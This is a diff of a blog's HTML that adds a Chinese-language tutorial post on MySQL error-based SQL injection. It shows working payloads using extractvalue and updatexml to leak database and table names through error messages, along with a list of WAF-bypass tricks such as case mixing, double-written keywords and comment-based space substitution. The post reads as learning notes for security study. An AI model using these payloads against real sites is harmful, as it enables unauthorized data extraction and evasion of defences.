@@ -127,6 +127,81 @@
   
     
       <article
+id="post-报错注入和注入绕过"
+class="article article-type-post"
+>
+
+
+
+<div class="article-inner">
+    
+
+    <div class="article-body">
+    <header class="article-title">
+        <a href="/2022/12/05/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%92%8C%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/"></a>
+    </header>
+    <div class="article-entry post-inner-html">
+        
+        <h1 id="报错注入和注入绕过"><a href="#报错注入和注入绕过" class="headerlink" title="报错注入和注入绕过"></a>报错注入和注入绕过</h1><p>mysql中的extractvalue函数</p>
+<p>原理：extractvalue是对对XML文档进行查询的函数，参数2是查询得到div标签下的值为value，如果查询标签名格式不对就会报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select extractvalue(&#x27;&lt;div&gt;value&lt;/div&gt;&#x27;,&#x27;div&#x27;); </span><br><span class="line"></span><br><span class="line">+----------------------------------------+</span><br><span class="line">| extractvalue(&#x27;&lt;div&gt;value&lt;/div&gt;&#x27;,&#x27;div&#x27;) |</span><br><span class="line">+----------------------------------------+</span><br><span class="line">| value                                  |</span><br><span class="line">+----------------------------------------+</span><br></pre></td></tr></table></figure>
+
+<p>concat：用来连接两个字符串（如没有第一个参数符合就不会显示报错）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select concat(&#x27;*&#x27;,&#x27;div&#x27;);</span><br><span class="line">+-------------------+</span><br><span class="line">| concat(&#x27;*&#x27;,&#x27;div&#x27;) |</span><br><span class="line">+-------------------+</span><br><span class="line">| *div              |</span><br><span class="line">+-------------------+</span><br></pre></td></tr></table></figure>
+
+<p>两个函数嵌套使用如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(&#x27;div&#x27;,concat(&#x27;~&#x27;,database()))</span><br><span class="line"></span><br><span class="line">mysql&gt; select extractvalue(&#x27;div&#x27;,concat(&#x27;~&#x27;,database()));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~test&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>获取表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(&#x27;div&#x27;,concat(&#x27;~&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;test&#x27;)));</span><br></pre></td></tr></table></figure>
+
+<p>updatexml（目标xml文档，xml路径，更新的内容）</p>
+<p>原理:用来更新xml文档的值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select updatexml(&#x27;&lt;div&gt;value1&lt;/div&gt;&#x27;,&#x27;div&#x27;,&#x27;value2&#x27;);</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">| updatexml(&#x27;&lt;div&gt;value1&lt;/div&gt;&#x27;,&#x27;div&#x27;,&#x27;value2&#x27;) |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">| value2                                        |</span><br><span class="line">+-----------------------------------------------+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and updatexml(&#x27;div&#x27;,concat(&#x27;~&#x27;,database()),&#x27;value&#x27;);</span><br></pre></td></tr></table></figure>
+
+<h2 id="注入绕过"><a href="#注入绕过" class="headerlink" title="注入绕过"></a>注入绕过</h2><p>1 大小写绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">比如 and 和AND 但没有过滤And</span><br><span class="line">再比如 过滤了select SELECT 但是没有过滤SelEct</span><br></pre></td></tr></table></figure>
+
+<p>2 双写绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">比如waf 把and替换成空字符串 anandd 过滤之后可得到and</span><br></pre></td></tr></table></figure>
+
+<p>3 空格过滤绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">空格替换成/**/、括号空格旁边的参数、回车%0a、用`替换空格、tab替换空格</span><br></pre></td></tr></table></figure>
+
+<p>4 绕过and or</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp;&amp; and</span><br><span class="line">|| or</span><br></pre></td></tr></table></figure>
+
+<p>5 &#x3D;绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">= 改成 like</span><br></pre></td></tr></table></figure>
+        
+    </div>
+    </div>
+
+    <div class="article-badge">
+        
+        
+    </div>
+
+</div>
+
+<footer class="article-footer">
+    <div class="article-more-info">
+    <div class="article-date">
+  <time datetime="2022-12-05T02:14:36.394Z" itemprop="datePublished">2022-12-05</time>
+</div>
+    
+    
+    </div>
+</footer>
+
+</article>
+
+    
+  
+    
+      <article
 id="post-CVE-2021-21972漏洞复现"
 class="article article-type-post"
 >
@@ -225,6 +300,10 @@ class="article article-type-post"
     <div class="widget-title"><span>Recent Posts</span></div>
     <div class="widget-inner">
       <ul>
+        
+          <li>
+            <a href="/2022/12/05/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%92%8C%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/">(no title)</a>
+          </li>
         
           <li>
             <a href="/2022/12/02/CVE-2021-21972%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">CVE-2021-21972漏洞复现</a>
